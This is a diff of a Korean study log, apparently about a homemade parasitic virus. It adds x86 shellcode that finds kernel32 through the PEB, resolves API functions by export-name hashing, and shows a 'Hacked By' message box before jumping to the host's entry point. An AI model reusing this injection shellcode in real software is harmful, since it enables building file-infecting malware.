@@ -71,11 +71,20 @@ binary mode로 열면 0x0A를 Carriage Return으로 의미부여를 하지 않�
 
 홈메이드 악성코드에 user32.dll을 로딩하는 코드를 추가했다.
 		
+		xor ebx, ebx
+		mov ebx, fs : [0x30] // ebx = PEB 주소
+		mov ebx, [ebx + 0xc] // ebx = PEB_LDR_DATA 주소
+		mov ebx, [ebx + 0x14] // ebx = LDR_DATA_TABLE_ENTRY(this.cpp)+0x8
+		mov ebx, [ebx] // ebx = LDR_DATA_TABLE_ENTRY(ntdll.dll)+0x8
+		mov ebx, [ebx] // ebx = LDR_DATA_TABLE_ENTRY(kernel32.dll)+0x8
+		mov ebx, [ebx + 0x10] // ebx = kernel32.dll Base 주소
+
 		push 0x00006C6C
 		push 0x642E3233
 		push 0x72657375
 		push esp
-		mov eax, 0x76BE2A40
+		mov eax, 0x22A40 ; LoadLibrary RVA: 22A40
+		add eax, ebx
 		call eax
 		mov esi, eax
 		add esi, 0x000810A0 ; MessageBoxA RVA
@@ -105,3 +114,174 @@ binary mode로 열면 0x0A를 Carriage Return으로 의미부여를 하지 않�
 		jmp eax
 
 이제 정상적으로 실행됨
+
+2020.12.26 토요일
+
+오랜만에 깊숙히 쳐박혀있던 프로젝트를 꺼내서 보던도중 패러매니 바이러스가 제대로 작동하지 않는것을 발견했다.
+이유는 운영체제가 업데이트 될때마다 기본 api들의 RVA가 바뀌기 때문이었음.
+따라서 함수주소를 유동적으로 구해올 필요가 생겼다.
+
+
+		jmp start
+
+		hash_operator :
+
+			push edx
+			xor edx, edx
+			push edx
+			push edx
+			push edx
+			mov dword ptr[esp + 4], 0
+			jmp L3_hash
+
+
+		L2_hash :
+
+			inc dword ptr[esp + 4] // 반복문 변수++
+
+			// 이중 반복문 변수 초기화
+			mov edx, [esp]
+			xor dword ptr[esp], edx
+			// 해쉬 카운터 초기화
+			mov edx, [esp + 8]
+			xor dword ptr[esp + 8], edx
+
+		L3_hash :
+
+			push ebx
+			mov ebx, [esp + 8]
+			lea edx, [ebx * 4] // i*4
+			pop ebx
+
+			add edx, ecx // Name Pointer Table 오프셋 + i * 4
+
+			mov esi, [ebx + edx] // esi = Name Pointer Table 주소 + i * 4 즉, 타켓 함수
+			add esi, ebx
+			jmp DL3_hash
+
+		DL2_hash :
+			inc dword ptr[esp]
+
+		DL3_hash :
+
+			xor eax, eax
+			lodsb
+			add dword ptr[esp + 8], eax // [esp]번째 글자를 카운트
+
+			cmp al, 0 // null 문자를 만난것이 아니라면
+			jne DL2_hash // 계속 반복
+
+			mov edx, [esp + 12]
+			cmp dword ptr[esp + 8], edx // 계산한 해쉬값과 찾을 함수의 해쉬값이 다르면
+			jne L2_hash // 반복
+
+			mov edx, [esp + 4] // 서수를 구함.
+			pop eax
+			pop eax
+			pop eax
+			pop eax
+
+			ret
+
+		ordinal_operator :
+
+			mov esi, [ecx + 0x24] // esi = Ordinal Table 오프셋
+			add esi, ebx // esi = Ordinal Table 주소
+
+			lea esi, [esi + edx * 2] // 서수 테이블의 데이터 크기는 2바이트 이므로 곱하기 2를 해줌
+			xor eax, eax
+			lodsw
+
+			ret
+
+		get_func_addr :
+		/*
+		 * ax = Ordinal Table 에서 구한 값
+		 */
+
+			mov esi, [ecx + 0x1C] // Address Table 오프셋
+			add esi, ebx // esi = Address Table 주소
+			mov edx, [esi + eax * 4] // edx = 함수 오프셋
+			add edx, ebx // edx = 함수주소
+
+			ret
+
+		start :
+
+		// kernel32.dll Base 주소구하기 ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+			xor ebx, ebx
+			mov ebx, fs : [0x30] // ebx = PEB 주소
+			mov ebx, [ebx + 0xc] // ebx = PEB_LDR_DATA 주소
+			mov ebx, [ebx + 0x14] // ebx = LDR_DATA_TABLE_ENTRY(this.cpp)+0x8
+			mov ebx, [ebx] // ebx = LDR_DATA_TABLE_ENTRY(ntdll.dll)+0x8
+			mov ebx, [ebx] // ebx = LDR_DATA_TABLE_ENTRY(kernel32.dll)+0x8
+			mov ebx, [ebx + 0x10] // ebx = kernel32.dll Base 주소
+			push ebx
+
+		// kernel32.dll속 함수 주소 구하기 ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+
+			mov ecx, [ebx + 0x3c] // ecx = IMAGE_NT_HEADERS 오프셋
+			mov ecx, [ebx + ecx + 0x78] // ecx = EXPORT_TABLE 오프셋
+			lea edx, [ebx + ecx] // edx = EXPORT_TABLE 주소
+			push edx
+
+			mov ecx, [ebx + ecx + 0x20] // ecx = Name Pointer Table 오프셋
+
+			mov edx, 1402 // GetProcAddress 함수의 해쉬값
+			call hash_operator
+			mov ecx, [esp] // ecx = EXPORT_TABLE 주소
+			call ordinal_operator
+			call get_func_addr
+
+			push edx
+
+		// 매개변수들을 설정하고 함수호출.
+		push 0x00000000
+		push 0x41797261
+		push 0x7262694C
+		push 0x64616F4C
+		push esp
+		push ebx
+		call edx // GetProcAddress(kernel32.dll, "LoadLibraryA")
+		add esp, 0x10
+
+		push 0x00006C6C
+		push 0x642E3233
+		push 0x72657375
+		push esp
+		call eax // LoadLibraryA("user32.dll")
+		add esp, 0xC
+
+		pop edx // 저장했던 GetProcAddress 함수주소 꺼내기
+		push 0x0041786F
+		push 0x42656761
+		push 0x7373654D
+		push esp
+		push eax
+		call edx // GetProcAddress(user32.dll, "MessageBoxA")
+		mov esi, eax
+
+		push 0x00002121; !!
+		push 0x6F6D6761; agmo
+		push 0x72502079; y Pr
+		push 0x42206465; ed B
+		push 0x6B636148; Hack
+		mov eax, esp // eax = Hacked By Pragmo!!
+
+		push 0x00000000
+		push 0x61686168; haha
+		mov ebx, esp // ebx = haha
+
+		push 0
+		push ebx
+		push eax
+		push 0
+		call esi
+
+		add esp, 0x1C
+
+		mov eax, 0x12345678
+		jmp eax
+
+예전에 공부해뒀던 유니버셜 쉘코드 개념을 활용해서 함수주소를 유동적으로 구함.
